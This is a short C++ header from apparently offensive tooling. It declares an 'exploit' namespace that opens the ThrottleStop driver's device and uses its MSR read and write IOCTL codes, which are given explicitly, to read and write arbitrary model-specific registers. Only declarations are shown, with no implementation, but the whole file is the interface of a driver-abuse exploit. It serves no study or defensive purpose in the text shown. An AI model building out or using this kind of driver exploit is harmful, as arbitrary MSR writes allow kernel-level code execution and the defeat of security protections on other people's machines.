#pragma once

#define DEVICE_NAME "\\\\.\\ThrottleStop"

#define IOCTL_READ_MSR	0x80006448
#define IOCTL_WRITE_MSR 0x8000644C

#pragma pack( push, 1 )
struct WriteMsrStruct
{
	uint32_t msr_address;
	uint64_t msr_value;
};
#pragma pack( pop )

namespace exploit
{
	extern HANDLE h_device;

	bool open_handle( );
	void close_handle( );

	bool write_msr( uint32_t address, uint64_t value );
	bool read_msr( uint32_t address, uint64_t* ptr_value );
}